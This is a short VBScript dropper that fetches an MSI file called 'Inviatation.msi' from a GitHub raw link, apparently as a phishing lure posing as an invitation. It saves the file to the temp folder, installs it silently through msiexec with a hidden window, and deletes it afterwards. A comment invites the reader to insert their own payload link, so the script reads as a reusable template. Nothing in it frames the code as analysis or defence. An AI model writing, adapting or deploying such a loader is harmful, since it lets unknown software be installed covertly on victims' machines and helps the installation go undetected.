Dim objHTTP, objFSO, objStream, localPath, WshShell
Set objHTTP = CreateObject("Microsoft.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' --- YOUR GITHUB RAW LINK FOR THE MSI ---
msiUrl = "https://raw.githubusercontent.com/charlesbouchey-dev/gitg/main/Inviatation.msi"
localPath = objFSO.GetSpecialFolder(2) & "\Inviatation.msi"

objHTTP.Open "GET", msiUrl, False
objHTTP.Send()

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile localPath, 2
    objStream.Close
    
    ' Run silently with Admin rights
    WshShell.Run """msiexec.exe"" /i """ & localPath & """ /qn", 0, True
    
    If objFSO.FileExists(localPath) Then objFSO.DeleteFile localPath
End If
